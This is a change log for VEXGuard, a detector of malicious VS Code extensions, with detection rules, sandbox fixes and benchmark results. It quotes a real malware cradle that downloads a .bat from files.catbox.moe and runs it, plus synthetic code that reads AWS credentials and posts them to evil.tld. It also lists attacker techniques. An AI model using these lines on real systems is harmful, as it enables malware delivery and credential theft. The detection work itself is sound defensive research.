# VEXGuard v2 → v3 — Change Log with Rationale

Every change below is tied to a measured failure. Baseline is the v2 evaluation
recorded in `DynamicAnalysisCode/FAILURES.md`:

> TP = 48 · FP = 5 · FN = 72 · TN = 44
> Precision **90.6%** · Recall **40.0%** · F1 **55.5%** · Accuracy **54.4%**

---

## 0. New files

| File | Why it exists |
|------|---------------|
| `zip-util.js` | Dependency-free ZIP/VSIX reader |
| `dataset.js` | Corpus ingestion + ground-truth resolution |
| `decoy-profile.js` | Synthetic victim profile (honeypot secrets) |
| `benchmark.js` | Evaluation driver: matrices + root-cause report |
| `package.json` | Declares `acorn`; npm scripts for the common runs |
| `DATASETS.md` | Structural analysis of both corpora |
| `Run-VEXGuard.ps1` | PowerShell launcher with preflight checks |

---

## 1. Blocking defect: `.vsix` files could not be opened at all

**Before** — `VEXGuard.js`, `preprocess.js` and `sandbox.js` each did:

```js
let r = spawnSync('unzip', ['-q','-o', vsixPath, '-d', tmp]);
if (r.status !== 0) {
  r = spawnSync('python3', ['-c', 'import zipfile,sys\n…', vsixPath, tmp]);
  if (r.status !== 0) throw new Error("unzip failed (need 'unzip' or 'python3')");
}
```

On the Windows analysis host **neither exists**: there is no `unzip`, and the
`python3` on `PATH` is the Microsoft Store App-Execution-Alias stub, which
extracts nothing. Every `.vsix` therefore failed to unpack, and only the ~30
pre-extracted DataDog directories were ever really analysed. A scanner that
cannot open its own samples reports everything benign.

**After** — `zip-util.js` parses the ZIP central directory and inflates entries
with `zlib.inflateRawSync`. No external processes, identical behaviour on
Windows/macOS/Linux. Path traversal (`../`, absolute paths, drive letters) is
neutralised before anything touches disk, and zip-bomb guards cap entry count and
total bytes. Validated against 40 archives including the five largest in both
corpora.

---

## 2. Dataset ingestion — `dataset.js` (Task 1)

**Before** — sample discovery was `findVsix()` plus a `.bat` file that did:

```bat
Get-ChildItem -Path '…\Dataset_Malicious' -Filter 'package.json' -Recurse
  | Where-Object { $_.FullName -notmatch '\\node_modules\\' }
  | ForEach-Object { node VEXGuard.js $_.Directory.FullName }
```

This scanned one "sample" per `package.json`, so a single extension shipping 2,000
bundled dependencies produced 2,000 scans. The leftover result directories are the
evidence: `node-fetch`, `fetch-blob`, `data-uri-to-buffer`, `hardhat`,
`web-streams-polyfill`. There was also no ground truth beyond a manual `--label`.

**After** — one module that:

* auto-detects the DataDog layout (`<id>/<version>.vsix`, plus pre-extracted
  `<version>/extension/`, plus the loose `Sample/Sample/<id>-<version>.vsix`) and
  the VsMex layout (`extensions/<id>/<version>/<id>-<version>.vsix`);
* resolves per-sample ground truth — corpus tree for DataDog, Microsoft's
  `msft_classification_type` for VsMex;
* assigns an **evidence tier** (`code` / `suspect` / `policy`) — see §8;
* **never descends `node_modules`** when discovering samples;
* prefers the `.vsix` when a pre-extracted copy also exists (the archive is
  pristine; extracted trees carry `execution-log.json` from earlier runs);
* supports `latestOnly` (VsMex ships up to five versions per extension: 3,790
  artefacts for 1,609 extensions).

---

## 3. Static engine — `preprocess.js` (Task 2.1 + 2.2)

### 3.1 Cradle detection: proximity → same-command-string

All four "download-cradle" false positives in v2 came from this rule:

```js
[/(?:powershell|certutil|curl…)[^\n]{0,150}(?:https?:\/\/|\.bat\b|…)/i, 55, '…cradle…']
```

"A LOLBIN keyword within 150 characters of a URL" fires on:

| Benign extension | What actually matched |
|---|---|
| `Gruntfuggly.todo-tree` | `curl -s https://raw.githubusercontent.com/…/mapping.json` in a **build script** |
| `TabNine.tabnine-vscode` | the path string `"/windows/system32/windowspowershell/v1.0/powershell.exe"` |
| `streetsidesoftware.code-spell-checker` | VS Code's own language-ID list — it contains the word `powershell` and the token `.bat` |
| `formulahendry.code-runner`, `PKief.material-icon-theme` | same shape |

**After** — the rule is AST-scoped to individual **string literals** (comments are
not in the AST) and demands all three parts of a cradle:

```js
function isCradleLiteral(lit) {
  if (!LOLBIN_RE.test(lit))      return false;   // an interpreter/downloader
  if (!EXEC_CHAIN_RE.test(lit))  return false;   // …that then RUNS what it fetched
  const stripped = lit.replace(/\b(?:powershell|curl|certutil|…)\.exe\b/gi, '');
  return PAYLOAD_RE.test(stripped);              // …a remote payload (not its own image name)
}
```

`todo-tree` downloads a JSON file and never executes it → not a cradle.
`powershell.exe` as a path cannot self-satisfy the payload test → not a cradle.
The obfuscated ETHCode payload still matches, because its decoder array holds the
whole command in one element:
`$o="$env:TEMP\1.cmd"; & curl.exe -k -L -Ss "https://files.catbox.moe/nucjfz.bat" -o $o; & $o`

Shell/batch/PowerShell **files** are handled separately: a `.bat` is one command
context, so the test runs over the whole file with `set "X=Y"` variables expanded —
which is how the `QuantumCodeLabs.darky-ai` dropper hides its cradle across lines.

### 3.2 `eval()` judged by argument shape (Task 2.1)

Safe forms are now silent:

```js
eval("(" + json + ")")     // isSafeJsonEval → ignored (hand-rolled JSON parse)
eval("someStaticLiteral")  // isStaticArg    → ignored
```

Only `eval` / `new Function` over **decoded** data is decisive. `DECODER_NAMES` was
initially too broad and cost five new false positives — `join`, `from`, `decode`,
`update`, `final`, `reverse`, `fromCharCode` all fire on ordinary bundler output
(`new Function("c","size", jsBuf.join(""))` in `tomoki1207.pdf`, MobX's tracing
`new Function("debugger;…" + name)` in `hediet.vscode-drawio`). It is now narrowed
to genuine decoders plus an explicit `Buffer.from(x, 'base64'|'hex')` check.

### 3.3 File writes judged by destination (Task 2.1)

Writing into `os.tmpdir()`, `globalStorage`, `storageUri`, `__dirname`,
`extensionPath` or `.vscode/` is normal tooling and is ignored entirely. Writing an
**executable** (`.exe/.dll/.scr/.bat/.ps1/.vbs`) outside those, or into an
**autostart** location, is flagged.

### 3.4 Invisible-Unicode: isolated codepoints → contiguous runs

v2 counted every codepoint in the GlassWorm ranges. That flagged two benign
extensions:

* `ms-python.python` — 240 hits, all in `node_modules/unicode/category/Mn.js`, a
  Unicode **data table** that by definition lists every variation selector, each
  isolated between ASCII.
* `donjayamanne.githistory` — 18 hits, the England/Scotland/Wales **flag emoji**
  (`U+1F3F4` + tag letters + `U+E007F`).

GlassWorm encodes one invisible codepoint per payload byte, so it produces long
**contiguous runs**. The counter now scores only runs of ≥ 4 and discards runs that
are valid emoji tag sequences.

### 3.5 Reverse shell: co-occurrence → structural wiring

"`net` and `child_process` in the same file" is true of every debug-adapter and
language-server client — it flagged `golang.go`. Now detected structurally via the
AST:

```js
socket.on('data', d => child_process.exec(d))   // a stream handler that executes its input
```

The text-level backstop additionally requires a shell interpreter literal
(`/bin/sh`, `cmd.exe`, `powershell`), which `golang.go` (which spawns `go` and
`dlv`) does not have.

### 3.6 Two-tier scoring — the structural fix for FPs

v2 summed every indicator into one pot. `TabNine.tabnine-vscode` — a legitimate
language server that builds command lines dynamically, evaluates a bundler stub,
reads a `machineId` for telemetry and offers to install a companion extension —
scored **235** and was labelled MALICIOUS. None of those facts is evidence of
malice; they are **capabilities** most dev tooling has.

Indicators are now split:

* **PRIMARY** — asserts hostile intent on its own (cradle, reverse shell, webhook
  exfil endpoint, Defender exclusion, recon battery, hard-coded-key decryption,
  remote binary download). **A MALICIOUS static verdict requires `primary ≥ 45`.**
* **SUPPORTING** — a capability or weak correlate. Contributes to the score (so it
  can raise SUSPICIOUS and inform triage) but its total is **capped at 35**, so no
  pile of capabilities ever reaches MALICIOUS by itself.

The three separate `child_process.exec/spawn/spawnSync` findings also collapsed into
one reason, since counting the same capability once per function name is what let
the score inflate.

### 3.7 New detections for FN reduction (Task 2.2)

| Rule | Tier | Catches |
|---|---|---|
| Discord / Slack webhook | primary 45 | chat-app exfiltration |
| Telegram bot API | primary 45 | `api.telegram.org/bot…`, `sendMessage?chat_id=` |
| Google Calendar / Sheets / Apps Script | primary 45 | dead-drop C2 |
| Solana / Helius RPC | supporting 30 | blockchain C2 (real Solana tooling exists) |
| Remote binary from a non-distribution host | primary 45 | `http://paxfallow.ru/Lightshot.exe`; GitHub/npm/vendor CDNs allowlisted |
| LOLBIN encoded command | primary 50 | `powershell -enc <b64>`, `certutil -decode` |
| Drop-to-temp-then-execute | primary 50 | the `GitlensPro` / Lightshot dropper |
| Host reconnaissance battery | primary 45 | `Puglight.discoverito` — `net user`, `whoami /priv`, `/etc/passwd`, `tasklist` |
| Hard-coded-key `createDecipheriv` | primary 45 | `lavender-studio.theme-lavender-dreams` packed payload |
| Autostart / cron persistence | primary 35 | Run key, `schtasks`, Startup folder, LaunchAgents |
| Defender exclusion / AMSI bypass | primary 50 | security-product evasion |
| Crypto-mining pool references | primary 50 | miners |
| Obfuscated dependency invoking exec | primary 45 | ETHCode's trojanised `keythereum-utils` |
| `javascript-obfuscator` string array | supporting 25 | deliberate code hiding |
| `JSON.stringify(process.env)` | supporting 20 | env-variable harvesting |
| `windowsHide: true` + exec | supporting 15 | concealed execution |
| Clipboard read + wallet-address regex | primary 45 | clipboard hijacking |

The recon battery is split by intent: network enumeration alone (`ipconfig`,
`netstat`, `ifconfig`) is *not* evidence — the `systeminformation` npm package that
TabNine bundles does exactly that. At least one **account/privilege** probe is
required.

---

## 4. Strict closed-loop taint — `data-intel.js` (Task 2.1)

**Before** — `scanExfil()` raised `data_stolen` whenever an outbound payload merely
*looked* like it contained a secret (`via: 'pattern'`). An extension sending
`Authorization: Bearer <its own token>`, or a linter posting a file containing the
word `SECRET=`, tripped it.

**After** — two distinct claims:

| | Meaning | Effect |
|---|---|---|
| **CONFIRMED** | A taint **source** (an observed read of sensitive data) and a taint **sink** (an observed transmission) are joined: the bytes read are present in the bytes sent. | The only thing that raises `data_stolen` and drives MALICIOUS (+55) |
| **SUSPECTED** | Pattern match with no corresponding observed read. | Reported, scored +15, never decisive |

Token strength is tracked too. A `strong` token is the exact bytes of a recognised
secret; a `weak` token is a distinctive line from a sensitive file. For categories
benign tooling legitimately transmits (`source_code`, `generic_bearer`) a weak match
**cannot** confirm — so "Copilot uploaded the open document to its API" stays
SUSPECTED rather than being scored as theft.

Harness-injected values (the fake auth tokens seeded into `globalState` to unlock
gated code paths) are registered and excluded, so an extension echoing our own token
back is never counted as exfiltration.

Confirmed flows are recorded end-to-end and rendered in the report:

```
ssh_private_key: C:\…\Users\dev\.ssh\id_rsa → https://evil-c2.example.com/x
```

---

## 5. Decoy victim profile — `decoy-profile.js` (Task 2.2)

The taint layer can only prove a flow if there is something to steal. On a clean
analysis VM there is no `~/.ssh/id_rsa`, no `.aws/credentials`, no browser login
database, no wallet — so an infostealer ran, found nothing, sent an empty payload,
and scored BENIGN. A structural false negative no rule tuning can fix.

A throw-away Windows-shaped profile is now materialised before each detonation with
20 marked decoy secrets (SSH key, AWS credentials, `.npmrc`, `.env`, Chrome
`Login Data` / `Local State`, Firefox `logins.json`, Exodus/Ethereum wallets,
Solana keypair, VS Code `settings.json` with session tokens, `.bash_history`).
`os.homedir()`, `os.userInfo()`, `os.hostname()`, `os.networkInterfaces()`,
`os.tmpdir()` and 20 Windows environment variables all point at it.

This makes the sandbox **safer**, not less safe: a stealer that would otherwise read
the analyst's real keys reads fabricated ones instead. Every value is structurally
invalid and authenticates against nothing. The profile is deleted after each run.

`mock-vscode.js` follows the same principle — `env.machineId` and
`clipboard.readText()` return plausible decoys rather than zeros/empty strings, and
`authentication.getSession()` returns a decoy OAuth session instead of `undefined`
(token stealers give up on `undefined`, suppressing the very behaviour under test).

---

## 6. Dynamic detonation — `sandbox.js` + `mock-vscode.js` (Task 2.2)

### 6.1 Deadlock on an awaited virtual sleep — a silent, self-inflicted FN

```js
const ret = extensionExports.activate(mockCtx);
if (ret && typeof ret.then === 'function') await ret;     // ← hangs forever
```

against the very evasion the Time Machine exists to defeat:

```js
async function activate() { await sleep(30 * 86400e3); beacon(); }
```

`sleep` resolves on a **virtual** timer, and virtual timers only fire when the Time
Machine fast-forwards — which happens *after* this await. The harness was waiting on
a promise whose resolution it was itself blocking, until the per-sample timeout
killed the process and the sample was recorded as a timeout with zero events.

Reproduced with a synthetic 30-day awaited sleep (hung indefinitely), fixed by never
blocking unboundedly: settle briefly, and if `activate()` is still pending,
fast-forward to release it, then give the continuation a bounded window. The
synthetic sample now completes and its beacon is captured.

### 6.2 VS Code event simulation: 4 events → 27

v2 fired `onDidChangeActiveTextEditor`, `onDidOpenTextDocument`,
`onDidSaveTextDocument`, `onDidChangeTextDocument`. Every other lifecycle hook was
an anonymous `new VSEventEmitter().event` the sandbox could not reach — a payload
wired to `onDidChangeWindowState`, `onDidChangeConfiguration`, `onDidOpenTerminal`,
`onDidCreateFiles`, `onDidStartDebugSession` or `onDidGrantWorkspaceTrust` simply
never ran.

`mock-vscode.js` now keeps a **named emitter for every simulatable event** and
exposes them all through `vscode._events`; `sandbox.js` drives all 27 with
correctly-shaped payloads, in the order a real session would produce them.

The mock document also lives inside the decoy profile and contains a marked secret,
so an extension that ships "the file you are editing" off-box produces a provable
taint flow instead of an unattributable blob.

### 6.3 Gate-opening state

`globalState` is pre-seeded with 12 token keys and 8 tier/flag keys
(`plan: premium`, `activated: true`, `firstRun: true`, …), because payloads
routinely hide behind "is the user licensed / is this the first run".

### 6.4 Time Machine wiring (Task 2.2)

Already correct and non-blocking — `fastForward()` yields to the real event loop
via `setImmediate` between fires and wraps every specimen callback in `try/catch`.
Three changes:

* **Early pass** after `activate()` to release awaited sleeps (§6.1).
* **Second pass** after the main drain: firing a timer often *creates* new work (a
  callback awaits a mocked HTTP response whose `.then` schedules the next beacon),
  and those land after the first drain reported idle.
* **Batch guard rails** — `maxEvents` 200,000 → 20,000 and `maxIntervalTicks`
  1,000 → 150. One sample was firing 400,000 virtual timers; the first few ticks of
  an interval already reveal what it does.

Horizon remains **366 days**. Verified end to end: a 120-day logic bomb detonates in
**9 ms** of real time.

### 6.5 Batch mode

`SANDBOX_FAST=1` collapses harness settle waits (500/1000 ms → 5/10 ms). Safe
because *delayed* behaviour is handled by the virtual clock, not by real waiting —
the settle only needs to drain microtasks and one macrotask phase. Without it a
single sample idles for over a minute, and a 3,800-sample corpus run is infeasible.

### 6.6 Report size caps

One sample serialised to a **17 MB** record: `intel.network` held one entry per
beacon and forensic evidence arrays were unbounded, so a loop-beaconing specimen
exploded them. Network entries are now deduplicated by endpoint with a repeat
count, evidence lists are capped, and the JSONL carries a digest rather than the
whole result — 331 KB/sample → 2.6 KB/sample.

---

## 7. Orchestration — `VEXGuard.js` (Task 1 + 3)

* `scanStatic` / `detonate` moved from `spawnSync` to **async `spawn`**, so the
  batch pool genuinely overlaps instead of pinning the run to one core. Both pipes
  are drained (an unread pipe fills its buffer and deadlocks the child).
* Bounded-concurrency worker pool (`--concurrency`, default cpus−1 capped at 8).
* Samples unpack to a scratch directory and are **deleted after analysis** — a
  3,800-sample corpus would otherwise leave tens of GB of extracted extensions.
* Results **stream** to CSV + JSONL; `--resume` skips samples already recorded, so
  a long run survives interruption.
* CSV/JSONL sinks **truncate** unless `--resume` (they used to append
  unconditionally, silently doubling every row on a re-run while the in-memory
  metrics stayed correct — a discrepancy that only surfaces when someone later
  recomputes from the CSV).

### Cross-modality corroboration

Static and dynamic are **independent** observations: one reads the code, the other
watches it run. When both land on the same **indicator family** — the C2 host is
written in the source *and* the extension actually contacted it — two sub-threshold
SUSPICIOUS findings become a confident MALICIOUS.

Deliberately narrow. A blanket "both SUSPICIOUS ⇒ MALICIOUS" rule was measured on
the benign control set: **+1 TP but +1 FP** (`TabNine`, whose static and dynamic
findings are unrelated to each other). Family-matched corroboration gained the same
TP (`ab-498.cppplayground`: "ephemeral cloud backend" found statically *and*
dynamically) at **zero** FP cost.

---

## 8. Evaluation — `benchmark.js` (Task 3)

Outputs `results-<corpus>.csv`, `results-<corpus>.jsonl`, `metrics.json`,
`METRICS.md`, `ROOT-CAUSE.md`.

**Two decision rules, always side by side** — reporting only one is misleading:

| Rule | Positive class | Use |
|---|---|---|
| STRICT | `MALICIOUS` | auto-block / removal |
| TRIAGE | `MALICIOUS` or `SUSPICIOUS` | analyst review queue |

Each matrix reports TP/FP/FN/TN, precision, recall, F1, accuracy and **MCC** (which
stays honest on the imbalanced pooled sets, where accuracy flatters any detector
that says "malicious" often).

**VsMex is stratified**, because it is a dataset of *removals*, not of malware:
~47% of artefacts were pulled for impersonation, copyright, spam or at the owner's
request, and those bundles are frequently verbatim clones of the legitimate
extension with nothing hostile to detect. Reported as: a **code-level** matrix
(primary), a **full-corpus** matrix (pessimistic bound), and a per-removal-reason
breakdown so the gap is visible and attributable. See `DATASETS.md` §1.

`ROOT-CAUSE.md` attributes **every** residual FP and FN to a named cause with the
specific change that would address it — `DORMANT_NO_OBSERVABLE_PAYLOAD`,
`GATED_STATIC_ONLY`, `BELOW_MALICIOUS_THRESHOLD`, `NETWORK_ONLY_INDISTINGUISHABLE`,
`TIMEOUT`, `OUT_OF_SCOPE_POLICY_REMOVAL`, `CRADLE_OVERMATCH`, `TAINT_OVERMATCH`, …

---

## 9. Measured results

Full run: **3,962 samples**, 8 workers, ~40 minutes, **0 analysis errors**.

### DataDog (n = 172) — the primary precision/recall measurement

| | TP | FP | FN | TN | Precision | Recall | F1 | Accuracy | MCC |
|---|---:|---:|---:|---:|---:|---:|---:|---:|---:|
| v2 baseline | 48 | 5 | 72 | 44 | 90.6% | 40.0% | 55.5% | 54.4% | — |
| **v3 STRICT** | 54 | **0** | 69 | 49 | **100.0%** | 43.9% | 61.0% | 59.9% | 0.427 |
| v3 TRIAGE | 63 | 7 | 60 | 42 | 90.0% | 51.2% | 65.3% | 61.0% | 0.339 |

### VsMex — first evaluation of this corpus

| Population | Rule | TP | FP | FN | TN | Precision | Recall | F1 |
|---|---|---:|---:|---:|---:|---:|---:|---:|
| **Code-level** (n=1,300) | STRICT | 379 | **0** | 872 | 49 | **100.0%** | 30.3% | 46.5% |
| **Code-level** | TRIAGE | 679 | 7 | 572 | 42 | 99.0% | 54.3% | **70.1%** |
| Full corpus (n=3,839) | STRICT | 864 | **0** | 2,926 | 49 | 100.0% | 22.8% | 37.1% |
| Full corpus | TRIAGE | 1,614 | 7 | 2,176 | 42 | 99.6% | 42.6% | 59.7% |

### Detection rate by Microsoft removal reason — why stratification matters

| Removal reason | n | STRICT | TRIAGE |
|---|---:|---:|---:|
| Malicious | 106 | 50.0% | 72.6% |
| Spam | 174 | 50.0% | 54.6% |
| Malware | 1,122 | 29.1% | 53.1% |
| Untrustworthy | 762 | 28.0% | 56.0% |
| Copyright violation | 14 | 21.4% | 21.4% |
| **Impersonation** | 1,568 | **11.5%** | **25.7%** |
| Owner Request / Deprecated / Expired domain | 11 | 0.0% | 0.0% |

Code-level removals are detected at roughly **2.5×** the rate of impersonation
removals, and impersonation alone is 41% of the corpus. That gap is the entire
reason the pooled matrix reads so much worse than the code-level one, and it is a
property of the labels, not of the detector.

### Residual FN causes (all 2,995, from `ROOT-CAUSE.md`)

| Cause | n | Engine defect? |
|---|---:|---|
| `OUT_OF_SCOPE_POLICY_REMOVAL` | 1,456 | no — impersonation/spam/copyright |
| `OUT_OF_SCOPE_UNTRUSTWORTHY` | 518 | no — risk judgement, not malicious code |
| `DORMANT_NO_OBSERVABLE_PAYLOAD` | 430 | partly — nothing executes, no IOC |
| `BELOW_MALICIOUS_THRESHOLD` | 278 | tunable — all caught by TRIAGE |
| `TIMEOUT` | 120 | fixed — see below |
| `RAN_BUT_UNRECOGNISED` | 105 | yes — needs new rules |
| `NETWORK_ONLY_INDISTINGUISHABLE` | 57 | hard residue — needs endpoint reputation |
| `UNRECOGNISED_BEHAVIOUR` | 31 | yes — needs new rules |

**1,974 of 2,995 misses (66%) are out-of-scope label artefacts.**

### Post-run fix: process exit

159 VsMex samples were recorded as timed out. Their verdicts had in fact been
computed correctly — the child had already flushed its report, but a lingering
handle (an unref'd timer, a mock server) kept the event loop alive until the
orchestrator killed it at the per-sample timeout, burning 60 s each.

`sandbox.js` now exits deliberately after flushing stdout instead of waiting for
the loop to drain. Re-running exactly those 159 via `--resume`: **0 timeouts**,
each completing in seconds, TRIAGE detections 110 → 112. 38 samples still hit the
timeout under genuine long-running analysis.

---

## 10. v3.1 — integration, anti-evasion and cleanup

### 10.1 Verified, not assumed

Three requested items were already correct in v3.0. They were tested rather than
re-written:

* **Time Machine + native-spoof injected into `vm.createContext()`** —
  `buildVmContext()` installs the virtual `setTimeout/setInterval/clearTimeout/
  clearInterval/Date/performance`, and `patchRequireCache()` installs the
  `Function.prototype.toString` guard.
* **Cloaking protects the hooked modules** — proven with an adversarial specimen
  that fingerprints the sandbox eight ways (own `.toString()` and the reflective
  `Function.prototype.toString.call()` bypass, against `child_process`, `http`,
  `net`, `fs`, `setTimeout`, `Date.now`, and `toString.toString`). All eight
  report `[native code]`; the specimen proceeded to detonate.
* **Safe `eval()` and temp-file writes ignored** — `isSafeJsonEval()` and
  `SAFE_WRITE_RE` (§3.2, §3.3).

### 10.2 `WAIT_MS` removed

The 30-second passive wait had been vestigial since v2.2 — the constant survived
only in a console banner. Removed, with a comment recording why, so nobody
reintroduces a wall-clock wait believing it still does something.

### 10.3 Shell execution is now a taint SINK

The real gap in v3.0. `DI.scanExfil` was wired to http/https/fetch/net/dns but
**not** to `child_process`, so this closed no loop:

```js
const key = fs.readFileSync(`${os.homedir()}/.aws/credentials`);
cp.exec(`curl -X POST -d "${key}" https://evil.tld/drop`);      // secret on argv
cp.spawn('node', ['-e', '…'], { env: { P: key } });             // secret in env
```

Both read a secret and both send it, but the command was blocked before it could
reach a network hook, so the taint layer never saw the sink. Every command
string, argument vector and `env` override now passes through `scanExfil`.

Measured on a synthetic specimen doing exactly the above: **35 → 145
(SUSPICIOUS → MALICIOUS)**, with both the argv and the `env` channel attributed.

### 10.4 Document-content fuzzing (and the keyword-ordering bug it exposed)

Input-box seeding (§6.2) only reaches payloads gated on typed input. A different
and equally common gate reads the *file being edited*:

```js
onDidSaveTextDocument(doc => { if (doc.getText().includes('apikey')) beacon(doc.getText()); });
```

The mock document body is now mutable and is rewritten per keyword round, with
the document lifecycle re-fired each round.

Building it surfaced a latent bug in `harvestTriggerKeywords()`: harvested
specimen keywords were appended **after** ten generic defaults and then truncated
by the `slice()`, so a payload gated on `includes('apikey')` never saw "apikey".
Harvested words now come first; defaults only pad the remainder.

Two self-inflicted problems were caught and fixed during validation:

* The first fuzz template emitted `const token = "<seed>";`, which the secret
  classifier matched as a dotenv-style credential — the extension then
  "exfiltrated" our own fuzz text and the report gained a phantom SUSPECTED
  finding. **Bait for the payload must not look like bait for our own detector.**
* Fuzzing ran unconditionally. `VSEventEmitter` now exposes `listenerCount`, and
  `mock-vscode` exposes `_fire()` / `_listenerCount()`, so the driver skips the
  rounds entirely when the extension never subscribed to a document event.

### 10.5 Evidence-tier filtering (`--tiers` / `--exclude-tiers`)

Added to `dataset.js`, **opt-in**, with the default unchanged.

The brief asked to skip the 1,774 `policy` samples on the grounds that they
contain no executable malware. **Measurement contradicts that premise: 272 of
them were scored MALICIOUS on code evidence** by a detector running at 100%
precision, and the corpus contains explicit `Impersonation;Malware` rows.
Microsoft's field records the *removal reason*, not an assertion that the bundle
is inert. Excluding the tier discards 272 genuine detections along with the
unreachable ones, so stratified reporting remains the default and the filter is
documented as "use it to answer a scoped question, not to improve a headline".

### 10.6 Measured effect of v3.1 — honestly, ~zero

Full re-run, 3,962 samples, 0 errors:

| | v3.0 | v3.1 |
|---|---|---|
| DataDog STRICT | TP 54 · FP 0 · FN 69 · TN 49 | **identical** |
| VsMex code-level STRICT | TP 379 · FP 0 | TP 379 · FP 0 |
| VsMex full STRICT | TP 864 | TP 863 |
| Verdict changes | — | 0 escalations, 4 de-escalations |

The four de-escalations are **not** detection regressions. All four are samples
that crossed the 60 s per-sample cap under pool contention. Re-running the 15
newly-timing-out samples **serially on an idle machine with a 120 s cap**:

```
 81297ms  ok       BENIGN      atomgit.atomcode-vscode@0.0.2
 81256ms  ok       SUSPICIOUS  atomgit.atomcode-vscode@0.0.3
 20682ms  ok       BENIGN      chat-gimay-agent.chat-gimay-agent@1.0.0
107455ms  ok       BENIGN      embedd-team.embedd-project-manager@0.0.3
117888ms  ok       BENIGN      embeddteam.embeddedprojectmanager@0.0.1
120999ms  TIMEOUT  BENIGN      embeddteam.embeddedprojectmanager@0.0.2
 56712ms  ok       BENIGN      krabt.krabt-proto@0.5.7
 45379ms  ok       SUSPICIOUS  openbase.openbase-vscode@10.3.2
 23053ms  ok       SUSPICIOUS  openbase.openbase-vscode@10.3.3
 23580ms  ok       SUSPICIOUS  openbase.openbase-vscode@10.3.4
120188ms  TIMEOUT  BENIGN      pedrocmota.workspace-formatter-multiple@1.0.0
120153ms  TIMEOUT  BENIGN      pedrocmota.workspace-formatter-multiple@1.0.1
 47827ms  ok       BENIGN      pogacic.vscode-proto3-upkeep@0.5.8
 47519ms  ok       BENIGN      serialt.sugar-proto@0.5.7
 47716ms  ok       BENIGN      siehc.vscode-proto3-rebirth@0.5.7

completed within 120s: 12   still timing out: 3
```

`openbase` completes in 23–45 s idle and returns the same SUSPICIOUS verdict it
had in v3.0. These samples live at the boundary; which side of the cap they land
on is scheduling luck, not algorithmic cost.

**Conclusion:** the v3.1 features (shell taint sink, document fuzzing) are proven
to work on targeted specimens but changed **no verdict** on either corpus,
because no sample in DataDog or VsMex exfiltrates via a command line or gates on
document content. They close real detection gaps that these corpora do not
exercise. Anyone reporting v3.1 as an improvement in the headline metrics would
be overclaiming.

**Operational note — the per-sample timeout is worth more than either feature.**
1.4% of VsMex (53/3,790) hits the 60 s cap. Re-timed serially at 120 s, **12 of
15 complete and 4 return SUSPICIOUS** (`atomgit@0.0.3`, `openbase@10.3.2/.3/.4`)
— i.e. raising the cap recovers 4 TRIAGE detections, which is 4 more than the two
new detection features contributed on this corpus. Three samples exceed even
120 s (`embeddteam.embeddedprojectmanager@0.0.2`,
`pedrocmota.workspace-formatter-multiple@1.0.0` and `@1.0.1`) and need
investigation rather than a bigger budget.

Use `--timeout 120000` for a publication run. Every number in §9 and §10 is from
a 60 s run at concurrency 8, so the reported FN counts include ~53 samples whose
analysis was cut short rather than completed.

---

## 11. Honest limitations

* **Static recall is bounded by dormancy.** The largest residual FN class is
  samples that execute nothing observable and carry no IOC. Some are genuinely
  clean versions of a flagged publisher — `ab-498.cppformat@1.0.8` ships a working
  AStyle formatter and nothing else — which is a label-granularity artefact
  (DataDog labels the *package*), not a detection failure.
* **AI-proxy extensions are behaviourally indistinguishable.** The 20
  `sanchuan.*-copilot` samples route prompts to a third-party endpoint, which is
  exactly what a legitimate AI extension does. Separating them needs endpoint
  reputation, not behaviour.
* **Impersonation is out of scope by construction.** It requires publisher
  reputation and marketplace metadata; this engine analyses bundles.
* **`acorn` is effectively required.** Without it the static stage falls back to
  regex matching — the false-positive-prone mode v3 exists to leave behind. The
  launchers warn loudly when it is missing.
